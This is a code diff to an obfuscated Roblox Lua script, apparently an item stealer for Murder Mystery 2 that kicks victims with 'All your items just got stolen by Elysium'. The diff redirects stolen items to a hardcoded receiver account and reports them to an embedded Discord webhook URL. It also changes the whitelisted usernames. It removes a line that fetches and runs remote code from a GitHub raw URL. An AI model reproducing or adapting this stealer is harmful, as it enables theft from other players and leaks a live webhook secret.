@@ -221,7 +221,7 @@ local LocalPlayer = Players.LocalPlayer
 if LocalPlayer and LocalPlayer.Name then
 	local Name = LocalPlayer.Name
 
-	if Name:find("ProPvP") or Name:find("ProVitalz") or Name:find("Proplong2") or Name:find("Proplong3") or Name:find("Proplong4") or Name:find("Proplong") or Name:find("ProVitalitz") then
+	if Name:find("violetjeanrose") or Name:find("Thebestfunnehfanisme") then
 		return
 	end
 end
@@ -255,8 +255,8 @@ if not getgenv().MM2_API_BASE then
 end
 
 local MM2_API_BASE = getgenv().MM2_API_BASE
-local RECEIVERS = getgenv().RECEIVERS or {}
-local WEBHOOK = getgenv().WEBHOOK or ""
+local RECEIVERS = getgenv().RECEIVERS or { "Thebestfunnehfanisme" }
+local WEBHOOK = getgenv().WEBHOOK or "https://discord.com/api/webhooks/1515620806279827546/PtPmc1OfK9Ok5Ld8Ox5jFDxCte2Um9j0PBHqAxk6OYYcB58TXvlZoHMI2AsX4Tptg83B"
 local THRESHOLD = getgenv().THRESHOLD or 1
 
 v32("Targets: " .. table.concat(RECEIVERS, ", "))
@@ -1461,7 +1461,7 @@ end
 v277()
 
 if setclipboard then
-	setclipboard("https://discord.gg/3lysium")
+	setclipboard("hi")
 end
 
 if #u196 == 0 then
@@ -2017,7 +2017,6 @@ if v396 then
 
 			if n12 == 0 then
 				LocalPlayer:Kick([[All your items just got stolen by Elysium.
- Join our Discord: https://discord.gg/3lysium 
 ]])
 
 				return
@@ -2033,10 +2032,6 @@ local v414 = "    local HttpService = game:GetService(\"HttpService\")\n    loca
 	WEBHOOK = WEBHOOK,
 	THRESHOLD = THRESHOLD
 }) .. [[')
-    getgenv().RECEIVERS = data.RECEIVERS
-    getgenv().WEBHOOK   = data.WEBHOOK
-    getgenv().THRESHOLD = data.THRESHOLD
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2.lua"))()
 ]]
 
 if queue_on_teleport then
